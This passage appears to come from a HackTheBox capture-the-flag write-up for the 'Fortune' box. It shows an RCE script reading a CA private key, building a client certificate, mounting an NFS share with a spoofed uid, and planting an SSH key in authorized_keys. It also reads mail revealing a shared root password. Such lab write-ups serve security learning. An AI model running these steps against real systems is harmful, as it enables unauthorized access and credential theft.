zhZSFR8/JMUYhRLwdkjf8w3hA7GKF9VS3kioEDGROtx++ZQc1ljI7owLfDYfhQ08
0CJiXxmwO4XupL23cxu9i9464+knHvqvE1Uhj/L9HO5pVD5uAS2kePnSju7n08gg
miqzREAc0qzehpoJXuS50wJc4otGgU5l+Rsen8giWdR0a1TxKm2UF/wFQbSU+WwY
8F5PquwOz384mmQ/3k6SVj6HStCFb47bHEpvS5mvj2lzJMiLFtYkzSe2fDJJ444I
1Y4UXIOE/nKK/UDw4tOquxcYVD0oJ0lxpFhpSVtRu9R5cqYPJI2POQTj6Ucb7i+3
OpY+NpJ0mjem7/d1yCDtKIbz4pcJoaAtVQVDdzywPTe3LcdnGutvfiYJZJW/ENNG
z3Iw0vkQCeJTsUMg45x88QzAg8IG0jkqT0PEhXD6ul4fAgm0/8BCuEwNuMz9mHc9
DFhdfx5zU8OYUVpw4UB8IC2wbybyW+ftkcsfLngYasH3cZa1GpXq/qDByCW2C8kg
z4mKdO3yVIf087hyfCKWSH9OAH1FEDnhkWbLhkGcJENrIJuO7CNYRyBIjd1jxtUv
HinFDCeM/GeMJr2W154CniHjtXoiEeZ8LRY73qESZBqXukWxbOa7sA==
-----END CERTIFICATE-----

[?] command : cat /home/bob/ca/intermediate/private/intermediate.key.pem
[*] Result :


-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-use-them-to-generate-a-pkcs12-certificate-to-access-the-https-service-with-openssl-we-can-do-it-with-a-single-command-&quot;&gt;We can use them to generate a &lt;code class=&quot;highlighter-rouge&quot;&gt;PKCS12&lt;/code&gt; certificate to access the &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; service. with &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; we can do it with a single command :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -al
total 20
drwxr-xr-x 2 root root 4096 Aug  2 13:40 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -la
total 28
drwxr-xr-x 2 root root 4096 Aug  2 13:43 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw------- 1 root root 4237 Aug  2 13:43 fortune.p12
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-can-import-the-certificate-in-firefox-&quot;&gt;Now we can import the certificate in Firefox :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/fortune/8.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/fortune/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-removing-the-ssl-exception-it-will-ask-for-our-certificate-and-give-us-access-&quot;&gt;After removing the SSL exception it will ask for our certificate and give us access :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;elevated-network-access-nfs-user-flag&quot;&gt;Elevated Network Access, NFS, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-access-to-https-this-message-is-whats-on-the-index-page-&quot;&gt;After getting access to &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; this message is what’s on the index page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-didnt-know-what-authpf-was-so-i-searched-about-it&quot;&gt;I didn’t know what &lt;code class=&quot;highlighter-rouge&quot;&gt;authpf&lt;/code&gt; was so I searched about it.&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;authpf is a user shell for authenticating gateways. It is used to change pf rules when a user authenticates and starts a session with sshd and to undo these changes when the user’s session exits. It is designed for changing filter and translation rules for an individual source IP address as long as a user maintains an active ssh session. Typical use would be for a gateway that authenticates users before allowing them Internet use, or a gateway that allows different users into different places.  - &lt;a href=&quot;https://www.freebsd.org/cgi/man.cgi?query=authpf&amp;amp;apropos=0&amp;amp;sektion=8&amp;amp;manpath=FreeBSD+8.1-RELEASE+and+Ports&amp;amp;format=html&quot;&gt;freeBSD manual&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;so-basically-this-can-give-access-to-some-filtered-services-we-werent-allowed-to-access-before-to-use-it-we-need-a-key-and-luckily-we-can-generate-one-&quot;&gt;So basically this can give access to some filtered services we weren’t allowed to access before, to use it we need a key and luckily we can generate one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-3-users-on-the-box-i-tried-all-of-them-and-nfsuser-worked-&quot;&gt;We have 3 users on the box, I tried all of them and &lt;code class=&quot;highlighter-rouge&quot;&gt;nfsuser&lt;/code&gt; worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-is-the-time-for-another-nmap-scan-&quot;&gt;Now is the time for another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC fortune.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/fortune/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-two-new-ports-8081-which-is-running-http-and-2049-which-is-running-nfs-the-http-service-gives-us-this-message-&quot;&gt;We have two new ports, 8081 which is running &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;2049&lt;/code&gt; which is running &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service gives us this message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-probably-we-need-to-focus-on-nfs&quot;&gt;So probably we need to focus on &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt;.&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Network File System&lt;/strong&gt; (&lt;strong&gt;NFS&lt;/strong&gt;) is a &lt;a href=&quot;https://en.wikipedia.org/wiki/Distributed_file_system&quot;&gt;distributed file system&lt;/a&gt; protocol originally developed by &lt;a href=&quot;https://en.wikipedia.org/wiki/Sun_Microsystems&quot;&gt;Sun Microsystems&lt;/a&gt; in 1984, allowing a user on a client &lt;a href=&quot;https://en.wikipedia.org/wiki/Computer&quot;&gt;computer&lt;/a&gt; to access files over a &lt;a href=&quot;https://en.wikipedia.org/wiki/Computer_network&quot;&gt;computer network&lt;/a&gt; much like local storage is accessed.  -&lt;a href=&quot;https://en.wikipedia.org/wiki/Network_File_System&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-used-the-rce-script-to-check-etcexports-and-the-only-thing-there-was-home-&quot;&gt;I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; script to check &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/exports&lt;/code&gt; and the only thing there was &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : cat /etc/exports
[*] Result :

/home
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;by-using-nfs-ls-which-is-a-part-of-the-package-libnfs-utils-we-can-successfully-list-the-directories-&quot;&gt;By using &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs-ls&lt;/code&gt; (which is a part of the package &lt;code class=&quot;highlighter-rouge&quot;&gt;libnfs-utils&lt;/code&gt;) we can successfully list the directories :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# nfs-ls nfs://fortune.htb/home
drwxr-xr-x  2  1002  1002          512 nfsuser
drwxr-xr-x  5  1001  1001          512 bob
drwxr-x---  3  1000  1000          512 charlie
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-created-a-directory-called-it-mnt-and-mounted-the-nfs-share-in-it-&quot;&gt;I created a directory, called it &lt;code class=&quot;highlighter-rouge&quot;&gt;mnt&lt;/code&gt; and mounted the &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt; share in it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# mkdir mnt &amp;amp;&amp;amp; mount -t nfs fortune.htb:/home ./mnt
root@kali:~/Desktop/HTB/boxes/fortune# ls -la mnt
total 12
drwxr-xr-x 5 root root  512 Nov  3  2018 .
drwxr-xr-x 4 root root 4096 Aug  2 14:23 ..
drwxr-xr-x 5 1001 1001  512 Nov  3  2018 bob
drwxr-x--- 3 rick rick  512 Aug  2 12:21 charlie
drwxr-xr-x 2 1002 1002  512 Nov  3  2018 nfsuser
root@kali:~/Desktop/HTB/boxes/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;however-i-couldnt-access-charlies-directory-&quot;&gt;However I couldn’t access &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt;’s directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# cd mnt
root@kali:~/Desktop/HTB/boxes/fortune/mnt# cd charlie
-bash: cd: charlie: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-is-because-im-trying-with-root-whose-uid-is-0-&quot;&gt;This is because I’m trying with &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; whose &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/mnt# id 
uid=0(root) gid=0(root) groups=0(root)
root@kali:~/Desktop/HTB/boxes/fortune/mnt# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-the-way-nfs-permissions-work-i-need-to-have-the-same-uid-as-charlie-which-is-1000-&quot;&gt;And the way &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt; permissions work I need to have the same &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;1000&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : id charlie
[*] Result :

uid=1000(charlie) gid=1000(charlie) groups=1000(charlie), 0(wheel)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-already-have-a-user-on-my-box-with-the-uid-1000-called-rick-&quot;&gt;I already have a user on my box with the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 1000 called &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/mnt# id rick
uid=1000(rick) gid=1000(rick) groups=1000(rick)
root@kali:~/Desktop/HTB/boxes/fortune/mnt#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;privilege-escalation-root-flag&quot;&gt;Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-i-wanted-to-do-is-to-get-ssh-luckily-i-had-write-access-to-authorized_keys-&quot;&gt;First thing I wanted to do is to get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, luckily I had write access to &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ ls -la
total 22
drwxr-x--- 3 rick rick 512 Nov  6  2018 .
drwxr-xr-x 5 root root 512 Nov  3  2018 ..
-rw-r----- 1 rick rick 771 Oct 11  2018 .cshrc
-rw-r----- 1 rick rick 101 Oct 11  2018 .cvsrc
-rw-r----- 1 rick rick 359 Oct 11  2018 .login
-rw-r----- 1 rick rick 175 Oct 11  2018 .mailrc
-rw------- 1 rick rick 608 Nov  3  2018 mbox
-rw-r----- 1 rick rick 216 Oct 11  2018 .profile
drwx------ 2 rick rick 512 Nov  2  2018 .ssh
-r-------- 1 rick rick  33 Nov  3  2018 user.txt
-rw-r----- 1 rick rick  87 Oct 11  2018 .Xdefaults
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ cd .ssh
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ ls -la
total 4
drwx------ 2 rick rick 512 Nov  2  2018 .
drwxr-x--- 3 rick rick 512 Nov  6  2018 ..
-rw------- 1 rick rick   0 Oct 11  2018 authorized_keys
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-used-ssh-keygen-to-generate-a-private-and-a-public-key-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt; to generate a private and a public key :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# mkdir ssh
root@kali:~/Desktop/HTB/boxes/fortune# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Desktop/HTB/boxes/fortune/ssh/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.
Your public key has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.pub.
The key fingerprint is:
SHA256:OicgBWZAaEOpjbe8y6qqvgAEJwY0qDKuSuBXQ/Gt+Cs root@kali
The key's randomart image is:
+---[RSA 2048]----+
|%B*  .           |
|=O..  o .        |
|++. .. . .       |
|B o.. . .        |
|=+...+ .S        |
|+.o...o.         |
|oo o  +..        |
|+.o  E +.        |
|%++.  ..         |
+----[SHA256]-----+
root@kali:~/Desktop/HTB/boxes/fortune# cat ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali                               
root@kali:~/Desktop/HTB/boxes/fortune#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-wrote-my-public-key-to-authorized_keys-and-got-ssh-as-charlie-&quot;&gt;Then I wrote my public key to &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; and got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali&quot; &amp;gt;&amp;gt; authorized_keys 
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ cd ../../../ssh/
rick@kali:/root/Desktop/HTB/boxes/fortune/ssh$ su
Password: 
root@kali:~/Desktop/HTB/boxes/fortune/ssh# ssh charlie@fortune.htb -i id_rsa
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;in-the-home-directory-of-charlie-there-was-a-file-called-mbox-which-had-an-email-from-bob-to-charlie-thanking-him-for-setting-up-pgadmin4-for-him-and-also-telling-him-that-he-set-the-dba-password-to-the-same-as-root-password-&quot;&gt;In the home directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; there was a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;mbox&lt;/code&gt; which had an email from &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; thanking him for setting up &lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin4&lt;/code&gt; for him and also telling him that he set the &lt;code class=&quot;highlighter-rouge&quot;&gt;dba&lt;/code&gt; password to the same as root password :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fortune$ ls -al
total 44
drwxr-x---  3 charlie  charlie  512 Nov  5  2018 .
drwxr-xr-x  5 root     wheel    512 Nov  2  2018 ..
-rw-r-----  1 charlie  charlie   87 Oct 11  2018 .Xdefaults
-rw-r-----  1 charlie  charlie  771 Oct 11  2018 .cshrc
-rw-r-----  1 charlie  charlie  101 Oct 11  2018 .cvsrc
-rw-r-----  1 charlie  charlie  359 Oct 11  2018 .login
-rw-r-----  1 charlie  charlie  175 Oct 11  2018 .mailrc
-rw-r-----  1 charlie  charlie  216 Oct 11  2018 .profile
drwx------  2 charlie  charlie  512 Nov  2  2018 .ssh
-rw-------  1 charlie  charlie  608 Nov  3  2018 mbox
-r--------  1 charlie  charlie   33 Nov  3  2018 user.txt
fortune$ cat mbox                                                                                                                                                                                                 
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: &amp;lt;bob@fortune.htb&amp;gt;
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
        for &amp;lt;charlie@fortune.htb&amp;gt;;
        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  &amp;lt;bob@fortune.htb&amp;gt;
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: &amp;lt;196699abe1fed384@fortune.htb&amp;gt;
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob

fortune$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
